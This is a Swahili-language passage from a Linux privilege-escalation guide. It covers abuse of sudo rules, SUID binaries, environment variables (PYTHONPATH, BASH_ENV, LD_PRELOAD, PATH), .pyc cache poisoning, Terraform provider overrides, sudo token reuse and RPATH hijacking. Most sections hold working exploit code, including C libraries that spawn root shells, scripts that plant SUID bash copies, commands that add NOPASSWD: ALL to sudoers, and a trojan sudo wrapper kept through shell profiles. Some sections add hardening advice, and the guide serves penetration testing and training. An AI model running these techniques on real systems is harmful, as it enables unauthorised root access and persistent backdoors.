Ruhusa ya sudo isiyo na vizuizi na yenye uwezo wa root kwa `prusaslicer` au `prusa-slicer` inafaa kuchunguzwa ikiwa mpigaji anaweza kuchagua mradi wa `.3mf` utakaokatwa. Mradi unaweza kuwa na script ya uchakataji wa baadae inayoendeshwa G-code inaposafirishwa; miradi iliyoundwa mahsusi inaweza kutekeleza amri ndani ya PrusaSlicer hadi na kujumuisha toleo la 2.6.1 ([CVE-2023-47268](https://security-tracker.debian.org/tracker/CVE-2023-47268)). Thibitisha kanuni ya sudo inayotumika, toleo la binary na marekebisho ya vendor, chanzo cha mradi, na kama njia husika ya uhamishaji wa faili inaendeshwa kabla ya kuhitimisha kuwa mpaka wa ruhusa unaweza kufikiwa. Hoja ya mradi iliyowekwa maalum au sera inayotumika ya `NOEXEC` inaweza kubadilisha matokeo. Kugundua tu kuwa slicer imesakinishwa hakuthibitishi kuwa kuna njia ya kupandisha ruhusa.

### SETENV

Agizo hili humruhusu mtumiaji **kuweka kigezo cha mazingira** wakati wa kutekeleza kitu:

```bash
$ sudo -l
User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

Mfano huu, **uliotokana na mashine ya HTB Admirer**, ulikuwa **hatarini** kwa **PYTHONPATH hijacking** ili kupakia maktaba yoyote ya Python wakati script inaendeshwa kama root:

```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```

### Poisoning ya `__pycache__` / `.pyc` inayoweza kuandikwa katika imports za Python zinazoruhusiwa na sudo

Ikiwa **script ya Python inayoruhusiwa na sudo** ina-import module ambayo directory ya package yake ina **`__pycache__` inayoweza kuandikwa**, unaweza kubadilisha `.pyc` iliyohifadhiwa kwenye cache na kupata code execution kama mtumiaji mwenye haki za juu kwenye import inayofuata.<sup>[[30]](#references)</sup>

- Kwa nini inafanya kazi:
  - CPython huhifadhi bytecode cache katika `__pycache__/module.cpython-<ver>.pyc`.<sup>[[31]](#references)</sup>
  - Interpreter hukagua **header** (magic + metadata ya timestamp/hash inayohusishwa na source), kisha huendesha code object iliyohifadhiwa katika marshaled form baada ya header hiyo.
  - Ikiwa unaweza **kufuta na kuunda upya** faili ya cache kwa sababu directory inaweza kuandikwa, `.pyc` inayomilikiwa na root lakini isiyoweza kuandikwa bado inaweza kubadilishwa.
- Njia ya kawaida:
  - `sudo -l` inaonyesha script ya Python au wrapper unayoweza kuendesha kama root.
  - Script hiyo ina-import module ya ndani kutoka `/opt/app/`, `/usr/local/lib/...`, n.k.
  - Directory ya `__pycache__` ya module iliyo-importiwa inaweza kuandikwa na mtumiaji wako au na kila mtu.

Uchunguzi wa haraka:

```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```

Ikiwa unaweza kukagua script yenye marupurupu, tambua moduli zilizoingizwa na njia yake ya cache:<sup>[[32]](#references)</sup>

```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```

Mtiririko wa matumizi mabaya:

1. Endesha script inayoruhusiwa na sudo mara moja ili Python iunde faili halali ya cache ikiwa bado haipo.
2. Soma baiti 16 za kwanza kutoka kwenye `.pyc` halali na uzitumie tena kwenye faili lenye maudhui hasidi.
3. Compile payload code object, `marshal.dumps(...)` yake, futa faili asili ya cache, kisha uliunde upya kwa kutumia header asili pamoja na bytecode yako hasidi.
4. Endesha tena script inayoruhusiwa na sudo ili import itekeleze payload yako kama root.

Vidokezo muhimu:

- Kutumia tena header asili ni muhimu kwa sababu Python hukagua metadata ya cache dhidi ya faili chanzo, si kama mwili wa bytecode unalingana kweli na chanzo.
- Hii ni muhimu hasa ikiwa faili chanzo inamilikiwa na root na haiwezi kuandikwa, lakini saraka ya `__pycache__` iliyomo inaweza kuandikwa.
- `PYTHONDONTWRITEBYTECODE=1` na `python -B` huzuia Python kuandika faili mpya za `.pyc`; **hazimzuii** kupakia cache halali iliyopo ambayo mshambuliaji ameibadilisha. Kizuizi muhimu ni ikiwa mtumiaji mwenye mapendeleo ya chini anaweza kubadilisha cache ambayo import yenye mapendeleo itakubali. Python hukagua metadata ya timestamp/size au hash kabla ya kupakia bytecode iliyohifadhiwa kwenye cache. Tazama [marejeleo ya import ya Python](https://docs.python.org/3.12/reference/import.html#cached-bytecode-invalidation) na [nyaraka za command-line](https://docs.python.org/3.12/using/cmdline.html#envvar-PYTHONDONTWRITEBYTECODE).

Muundo wa chini kabisa wa proof-of-concept:

```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
    src = pathlib.Path(d) / "x.py"
    src.write_text(payload)
    code = compile(src.read_text(), str(src), "exec")
    pyc.unlink()
    pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```

Kuimarisha usalama:

- Hakikisha hakuna saraka kwenye njia ya uingizaji ya Python yenye ruhusa za juu inayoweza kuandikwa na watumiaji wenye ruhusa ndogo, ikijumuisha `__pycache__`.
- Kagua umiliki na ruhusa za saraka za akiba, pamoja na faili zilizopo za `.pyc`. Kuzima uandishi wa bytecode kunaweza kupunguza uundaji wa akiba mpya, lakini hakufanyi akiba iliyopo inayoweza kubadilishwa iwe salama.
- Chukulia moduli za Python za ndani zinazoweza kuandikwa na saraka za akiba zinazoweza kuandikwa kama unavyochukulia script za shell zinazoweza kuandikwa au maktaba zilizoshirikiwa zinazoendeshwa na root.

### BASH_ENV imehifadhiwa kupitia sudo env_keep → shell ya root

Ikiwa sudoers itahifadhi `BASH_ENV` (kwa mfano, `Defaults env_keep+="ENV BASH_ENV"`), unaweza kutumia tabia ya Bash ya kuanzisha shell zisizoingiliana ili kuendesha msimbo wowote kama root unapotekeleza amri inayoruhusiwa.<sup>[[24]](#references)</sup>

- Kwa nini inafanya kazi: Kwa shell zisizoingiliana, Bash hutathmini `$BASH_ENV` na kuendesha faili hiyo kwa `source` kabla ya kuendesha script lengwa. Sheria nyingi za sudo huruhusu kuendesha script au wrapper ya shell. Ikiwa sudo itahifadhi `BASH_ENV`, faili yako itaendeshwa kwa ruhusa za root.<sup>[[23]](#references)</sup>

- Mahitaji:
  - Sheria ya sudo unayoweza kutumia (lengo lolote linaloendesha `/bin/bash` bila mwingiliano, au script yoyote ya bash).
  - `BASH_ENV` iwepo kwenye `env_keep` (kagua kwa `sudo -l`).

- PoC:

```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```

- Uimarishaji:
  - Ondoa `BASH_ENV` (na `ENV`) kwenye `env_keep`, na upendelee `env_reset`.
  - Epuka wrappers za shell kwa amri zinazoruhusiwa na sudo; tumia binaries ndogo.
  - Fikiria kuweka logging ya I/O ya sudo na arifa wakati env vars zilizohifadhiwa zinatumika.

### Terraform kupitia sudo huku `HOME` ikihifadhiwa (!env_reset)

Sudo inapomruhusu Terraform kuendeshwa kama mtumiaji mwenye ruhusa za juu zaidi, `!env_reset` ni kidokezo cha kuchunguza ni environment variables zipi hasa zinazosalia kwa sheria hiyo mahususi. Thibitisha `HOME` au `TF_CLI_CONFIG_FILE` inayotumika kabla ya kuchukulia `.terraformrc` au `terraform.rc` inayoweza kuandikwa na mtumiaji anayeita amri kuwa ndiyo usanidi amilifu wa CLI. Ingizo la `provider_installation.dev_overrides` lina umuhimu tu ikiwa amri maalum ya Terraform inapakia provider hiyo na mtumiaji anayeita amri anaweza kuweka executable yake kwenye directory iliyochaguliwa.<sup>[[25]](#references)</sup>

- Elekeza provider inayohitajika kwenye directory inayoweza kuandikwa na uweke plugin hasidi yenye jina la provider (kwa mfano, `terraform-provider-examples`):

```hcl
# ~/.terraformrc
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/dev/shm"
  }
  direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```

Terraform itashindwa kukamilisha Go plugin handshake lakini itatekeleza payload kama root kabla haijazimika, na kuacha SUID shell nyuma.

### Bypasses za uthibitishaji wa symlink kwa kutumia overrides za TF_VAR

Vigezo vya Terraform vinaweza kutolewa kupitia environment variables za `TF_VAR_<name>` ikiwa sudo rule husika inazihifadhi. Kusoma kupitia source-symlink kunahitaji pia provider inayofuatilia linki hiyo na kunakili matokeo yaliyolindwa hadi kwenye eneo la mwisho ambalo mtumiaji anayeiita anaweza kusoma. Kuandika kupitia destination-symlink kunahitaji kando yake entry ya destination inayodhibitiwa na mtumiaji anayeiita na provider yenye upendeleo inayofuatilia linki hiyo wakati wa kuandika; kazi iliyopangwa itakayotekelezwa baadaye ni mojawapo tu ya matokeo yanayowezekana. Kagua ruhusa halisi ya sudo, faili husika za `.tf`, CLI config iliyochaguliwa, na umiliki wa njia kwa kutumia amri za kusoma tu kama `sudo -l`, `stat`, na `readlink` kabla ya kujaribu mojawapo ya njia hizo. Uthibitishaji dhaifu wa kileksika kama `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` hauazimui symlinks:<sup>[[25]](#references)</sup>

```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```

Terraform hutatua symlink na kunakili `/root/root.txt` halisi hadi eneo lengwa linaloweza kusomwa na mshambuliaji. Mbinu hiyo hiyo inaweza kutumika **kuandika** kwenye paths zenye mapendeleo ya juu kwa kuunda mapema symlink za eneo lengwa (kwa mfano, kuelekeza path ya eneo lengwa la provider ndani ya `/etc/cron.d/`).

### requiretty / !requiretty

Kwenye baadhi ya distributions za zamani, sudo inaweza kusanidiwa kwa `requiretty`, ambayo hulazimisha sudo iendeshwe tu kutoka kwa TTY shirikishi. Ikiwa `!requiretty` imewekwa (au chaguo hilo halipo), sudo inaweza kutekelezwa kutoka kwenye miktadha isiyo shirikishi kama vile reverse shells, kazi za cron au scripts.

```bash
Defaults !requiretty
```

Hii si vulnerability ya moja kwa moja yenyewe, lakini inapanua hali ambazo sheria za sudo zinaweza kutumiwa vibaya bila kuhitaji PTY kamili.

### Sudo env_keep+=PATH / secure_path isiyo salama → PATH hijack

Ikiwa `sudo -l` inaonyesha `env_keep+=PATH` au `secure_path` yenye maingizo ambayo mshambuliaji anaweza kuandikia (kwa mfano, `/home/<user>/bin`), amri ya nje isiyo na njia kamili ndani ya lengwa linaloruhusiwa na sudo inaweza kubadilishwa na amri nyingine yenye jina hilo hilo.<sup>[[3]](#references)</sup> Kutokuwepo kwa `secure_path` inayotumika pia kunastahili kuchunguzwa **ikiwa** mazingira ya sudo ya amri yanahifadhi `PATH` inayodhibitiwa na mtumiaji anayeita amri; kutokuwepo kwake pekee hakuthibitishi kuwa hivyo ndivyo ilivyo. Soma script iliyoruhusiwa bila kuiendesha, kisha thibitisha kanuni sahihi ya RunAs na hoja, njia ya utafutaji wa amri inayotumika, na saraka inayoweza kuandikiwa na kupitiwa ambayo iko mapema kwenye njia hiyo na ina amri yenye jina husika. Uthibitishaji, `NOEXEC`, shell builtins na njia kamili za amri vinaweza kubadilisha matokeo.

- Mahitaji: sheria ya sudo (mara nyingi `NOPASSWD`) inayoendesha script/binary inayotumia amri bila njia kamili (`free`, `df`, `ps`, n.k.) na ingizo la PATH linaloweza kuandikiwa na linalotafutwa kwanza.

```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```

### Kupita njia za utekelezaji wa Sudo
**Rukia** ili kusoma faili nyingine au kutumia **symlinks**. Kwa mfano, katika faili ya sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_

```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```

Ikiwa **wildcard** inatumika (\*), ni rahisi zaidi:

```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```

**Hatua za kukabiliana**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Amri ya Sudo/Binary ya SUID bila njia ya amri

Ikiwa **ruhusa ya sudo** imetolewa kwa amri moja **bila kubainisha njia**: _hacker10 ALL= (root) less_, unaweza kuitumia vibaya kwa kubadilisha kigezo cha PATH

```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```

Mbinu hii pia inaweza kutumika ikiwa binary ya **suid** **inatekeleza command nyingine bila kubainisha path yake (hakikisha kila mara kwa kutumia** _**strings**_ **maudhui ya binary ya SUID isiyo ya kawaida)**.

[Mifano ya payload za kutekeleza.](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### Binary ya SUID yenye path ya command

Ikiwa binary ya **suid** **inatekeleza command nyingine kwa kubainisha path**, basi unaweza kujaribu **ku-export function** yenye jina sawa na command ambayo faili ya suid inaita.

Kwa mfano, ikiwa binary ya suid inaita _**/usr/sbin/service apache2 start**_ unapaswa kujaribu kuunda na ku-export function hiyo:

```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```

Kisha, unapopiga simu binary ya suid, function hii itatekelezwa

### Wrappers maalum za kunakili za SUID

Utility ya SUID inayomilikiwa na root na inayokubali njia za chanzo na lengwa inaweza kuvuka mipaka miwili tofauti ya uaminifu. Ikiunda shell command kutoka kwa mojawapo ya arguments (kwa mfano, kupitisha command ya `cp` iliyoundwa kwa `system()`), shell metacharacters zinaweza kuendesha command nyingine kwa kutumia privileges zake za effective. Hata ikiendesha `cp` kwa usalama bila shell, destination isiyowekewa vizuizi inaweza kuruhusu kuandika faili yoyote kwa privileges za juu, kama vile `/etc/passwd`. Kagua jinsi wrapper inavyoshughulikia arguments, tabia ya effective UID, vizuizi vya destination, na kama faili iliyonakiliwa inaendelea kuwa na maudhui yaliyodhibitiwa na caller; kosa la kawaida la `cp` au SUID bit pekee havithibitishi mojawapo ya njia hizo. Orodhesha binary na permissions zake bila kuzibadilisha kabla ya majaribio yoyote ya mikono.

### Script inayoweza kuandikwa inayoendeshwa na wrapper ya SUID

Usanidi usio sahihi wa kawaida katika custom app ni wrapper ya binary ya SUID inayomilikiwa na root ambayo huendesha script, huku script yenyewe ikiweza kuandikwa na watumiaji wenye privileges za chini.

Muundo wa kawaida:

```c
int main(void) {
    system("/bin/bash /usr/local/bin/backup.sh");
}
```

Ikiwa una ruhusa ya kuandika kwenye `/usr/local/bin/backup.sh`, unaweza kuongeza amri za payload kisha utekeleze wrapper ya SUID:

```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```

Ukaguzi wa haraka:

```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```

Njia hii ya shambulio ni ya kawaida hasa katika vifungashio vya "maintenance"/"backup" vinavyosambazwa ndani ya `/usr/local/bin`.

### LD_PRELOAD & **LD_LIBRARY_PATH**

Kigezo cha mazingira cha **LD_PRELOAD** hutumika kubainisha maktaba moja au zaidi zinazoshirikiwa (faili za .so) ambazo loader itapakia kabla ya nyingine zote, ikiwemo maktaba ya kawaida ya C (`libc.so`). Mchakato huu hujulikana kama kupakia maktaba mapema.

Hata hivyo, ili kudumisha usalama wa mfumo na kuzuia kipengele hiki kisitumiwe vibaya, hasa na programu zinazotekelezwa za **suid/sgid**, mfumo hutekeleza masharti fulani:

- Loader hupuuza **LD_PRELOAD** kwa programu zinazotekelezwa ambapo kitambulisho halisi cha mtumiaji (_ruid_) hakilingani na kitambulisho cha mtumiaji chenye ufanisi (_euid_).
- Kwa programu zinazotekelezwa za suid/sgid, maktaba zilizo katika njia za kawaida ambazo pia ni za suid/sgid pekee ndizo hupakiwa mapema.

Kuongeza marupurupu kunaweza kutokea ikiwa unaweza kutekeleza amri kwa kutumia `sudo` na matokeo ya `sudo -l` yanajumuisha kauli **env_keep+=LD_PRELOAD**. Mipangilio hii huruhusu kigezo cha mazingira cha **LD_PRELOAD** kuendelea kuwepo na kutambuliwa hata amri zinapoendeshwa kwa kutumia `sudo`, na hivyo huenda ikasababisha utekelezaji wa msimbo wowote kwa marupurupu yaliyoinuliwa.<sup>[[9]](#references)</sup>

```
Defaults        env_keep += LD_PRELOAD
```

Hifadhi kama **/tmp/pe.c**

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Kisha **ikusanye** kwa kutumia:

```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

Hatimaye, **escalate privileges** kwa kuendesha

```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```

> [!CAUTION]
> privesc inayofanana inaweza kutumiwa vibaya ikiwa mshambulizi anadhibiti kigezo cha mazingira **LD_LIBRARY_PATH**, kwa sababu anadhibiti njia ambayo maktaba zitatafutwa.

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```

### Binary ya SUID – .so injection

Unapokutana na binary yenye ruhusa za **SUID** inayoonekana isiyo ya kawaida, ni vizuri kuthibitisha kama inapakia faili za **.so** ipasavyo. Unaweza kukagua hili kwa kutekeleza amri ifuatayo:<sup>[[17]](#references)</sup>

```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```

Kwa mfano, kukutana na hitilafu kama _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ kunaashiria uwezekano wa exploitation.

Ili kufanya exploit hii, mtu angeunda faili la C, tuseme _"/path/to/.config/libcalc.c"_, lenye msimbo ufuatao:

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

Mara tu inapokusanywa na kutekelezwa, code hii inalenga kuongeza ruhusa kwa kubadilisha ruhusa za faili na kutekeleza shell yenye ruhusa za juu.

Kusanya faili ya C hapo juu kuwa faili ya shared object (.so) kwa kutumia:

```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```

Mwishowe, kuendesha binary ya SUID iliyoathiriwa kunapaswa kuanzisha exploit, na hivyo kuruhusu uwezekano wa mfumo kuathiriwa.

## Shared Object Hijacking

```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

Sasa kwa kuwa tumepata binary ya SUID inayopakia library kutoka kwenye folda tunayo ruhusa ya kuandikia, hebu tuunde library kwenye folda hiyo kwa jina linalohitajika:

```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

Ukipata hitilafu kama vile

```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```

hiyo inamaanisha kwamba library uliyozalisha inahitaji kuwa na function inayoitwa `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) ni orodha iliyoratibiwa ya Unix binaries zinazoweza kutumiwa na attacker kukwepa vizuizi vya usalama vya ndani. [**GTFOArgs**](https://gtfoargs.github.io/) ni sawa na hiyo, lakini kwa hali ambapo unaweza **kuingiza arguments pekee** kwenye command.

Mradi huu hukusanya functions halali za Unix binaries zinazoweza kutumiwa kujinasua kutoka kwenye restricted shells, kufanya privilege escalation au kudumisha privileges zilizoinuliwa, kuhamisha files, kuanzisha bind na reverse shells, na kurahisisha kazi nyingine za post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Ikiwa unaweza kufikia `sudo -l`, unaweza kutumia tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) kuangalia kama inapata njia ya kutumia vibaya sudo rule yoyote.

### Kutumia Upya Sudo Tokens

Katika hali ambapo una **sudo access** lakini huna password, unaweza kufanya privilege escalation kwa **kusubiri command ya sudo itekelezwe kisha kuteka token ya session**.<sup>[[18]](#references)</sup>

Mahitaji ya kufanya privilege escalation:

- Tayari una shell kama user "_sampleuser_"
- "_sampleuser_" **ametumia `sudo`** kutekeleza kitu ndani ya **dakika 15 zilizopita** (kwa chaguo-msingi, hiyo ndiyo muda wa sudo token unaoturuhusu kutumia `sudo` bila kuingiza password)
- `cat /proc/sys/kernel/yama/ptrace_scope` ni 0
- `gdb` inapatikana (unaweza kuipakia)

(Unaweza kuwezesha `ptrace_scope` kwa muda kwa kutumia `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` au kuibadilisha kabisa kwenye `/etc/sysctl.d/10-ptrace.conf` na kuweka `kernel.yama.ptrace_scope = 0`)

Ikiwa mahitaji haya yote yametimizwa, **unaweza kufanya privilege escalation kwa kutumia:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- **Exploit ya kwanza** (`exploit.sh`) itaunda binary `activate_sudo_token` kwenye _/tmp_. Unaweza kuitumia **kuwezesha sudo token kwenye session yako** (hutapata root shell kiotomatiki; tekeleza `sudo su`):

```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```

- **Exploit ya pili** (`exploit_v2.sh`) itaunda shell ya sh ndani ya _/tmp_ **inayomilikiwa na root na yenye setuid**

```bash
bash exploit_v2.sh
/tmp/sh -p
```

- **exploit ya tatu** (`exploit_v3.sh`) **itatengeneza faili ya sudoers** litakalofanya **tokeni za sudo zidumu milele na kuruhusu watumiaji wote kutumia sudo**

```bash
bash exploit_v3.sh
sudo su
```

### /var/run/sudo/ts/\<Username>

Ikiwa una **ruhusa za kuandika** kwenye folda au kwenye faili zozote zilizoundwa ndani ya folda hiyo, unaweza kutumia binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) **kuunda sudo token kwa mtumiaji na PID**.\
Kwa mfano, ikiwa unaweza kubadilisha faili _/var/run/sudo/ts/sampleuser_ na una shell kama mtumiaji huyo yenye PID 1234, unaweza **kupata ruhusa za sudo** bila kuhitaji kujua nenosiri kwa kufanya:

```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```

### /etc/sudoers, /etc/sudoers.d

Faili `/etc/sudoers` na faili zilizo ndani ya `/etc/sudoers.d` husanidi ni nani anayeweza kutumia `sudo` na jinsi ya kuitumia. Kwa chaguomsingi, **ni mtumiaji root na kundi root pekee wanaoweza kusoma faili hizi**.\
**Ikiwa** unaweza **kusoma** faili hii, huenda ukaweza **kupata taarifa za kuvutia**, na ikiwa unaweza **kuandika** kwenye faili yoyote, utaweza **kuongeza mamlaka**.

```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```

Ikiwa unaweza kuandika, unaweza kutumia vibaya ruhusa hii.

```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```

Njia nyingine ya kutumia vibaya ruhusa hizi:

```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```

### DOAS

Kuna njia mbadala za binary ya `sudo`, kama vile `doas` ya OpenBSD. Kumbuka kuangalia usanidi wake katika `/etc/doas.conf`

```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```

Ikiwa doas inaruhusu kihariri au interpreter, angalia mbinu za kujinasua za mtindo wa GTFOBins:

```bash
doas vim
:!/bin/sh
```

A rule ya `doas` yenye uwezo wa root kwa `dstat` ya awali iliyotengenezwa kwa Python pia inahitaji ukaguzi wa njia za plugins. [Mwongozo](https://github.com/dstat-real/dstat/blob/master/docs/dstat.1) na [source code](https://github.com/dstat-real/dstat/blob/master/dstat) zake zinataja `/usr/share/dstat/` na `/usr/local/share/dstat/` kuwa miongoni mwa maeneo ya plugins za `dstat_*.py`. Ikiwa mtumiaji wa sasa anaweza kuandika kwenye eneo linalotumiwa na build iliyosakinishwa na kupita ndani yake, plugin iliyochaguliwa inaweza kuendeshwa kwa utambulisho wa RunAs wa `doas`. Thibitisha rule inayotumika, jinsi build hiyo inavyotafuta plugins, ruhusa au ACL za directory na parent directories zake, na kama anayeita anaweza kuchagua plugin; rule ya `dstat` au directory inayoweza kuandikika peke yake ni dalili tu. Implementations nyingine za `dstat` zinaweza kutumia mifumo tofauti ya plugins. Kagua metadata bila kupakia plugin.

### Sudo Hijacking

Ikiwa unajua kuwa **mtumiaji kwa kawaida huunganisha kwenye mashine na kutumia `sudo`** ili kupata privileges za juu, na umepata shell katika mazingira ya mtumiaji huyo, unaweza **kuunda executable mpya ya sudo** ambayo itaendesha code yako kama root na kisha amri ya mtumiaji. Kisha, **badilisha $PATH** ya mazingira ya mtumiaji (kwa mfano, kwa kuongeza njia mpya kwenye .bash_profile) ili mtumiaji anapoendesha sudo, executable yako ya sudo iendeshwe.

Kumbuka kwamba ikiwa mtumiaji anatumia shell tofauti (si bash), utahitaji kurekebisha faili nyingine ili kuongeza njia hiyo. Kwa mfano, [sudo-piggyback](https://github.com/APTy/sudo-piggyback) hurekebisha `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Unaweza kupata mfano mwingine kwenye [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Au kuendesha kitu kama:

```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```

## Maktaba ya Pamoja

### ld.so

Faili `/etc/ld.so.conf` huonyesha **mahali ambapo faili za usanidi zilizopakiwa zinatoka**. Kwa kawaida, faili hii huwa na njia ifuatayo: `include /etc/ld.so.conf.d/*.conf`

Hiyo inamaanisha kuwa faili za usanidi kutoka `/etc/ld.so.conf.d/*.conf` zitasomwa. Faili hizi za usanidi **huonyesha folda nyingine** ambamo **maktaba** zitakuwa **zinatafutwa**. Kwa mfano, maudhui ya `/etc/ld.so.conf.d/libc.conf` ni `/usr/local/lib`. **Hii inamaanisha kuwa mfumo utatafuta maktaba ndani ya `/usr/local/lib`**.

Ikiwa kwa sababu yoyote **mtumiaji ana ruhusa za kuandika** kwenye njia yoyote iliyoonyeshwa: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, faili yoyote ndani ya `/etc/ld.so.conf.d/` au folda yoyote iliyoorodheshwa ndani ya faili ya usanidi katika `/etc/ld.so.conf.d/*.conf`, anaweza kupata njia ya kuongeza mapendeleo.\
Tazama **jinsi ya kutumia vibaya usanidi huu usio sahihi** katika ukurasa ufuatao:


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH

```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x0068c000)
 libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x005bb000)
```

Kwa kunakili lib ndani ya `/var/tmp/flag15/`, programu itaitumia ikiwa mahali hapa kama ilivyobainishwa kwenye kigezo cha `RPATH`.

```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x005b0000)
 libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x00737000)
```

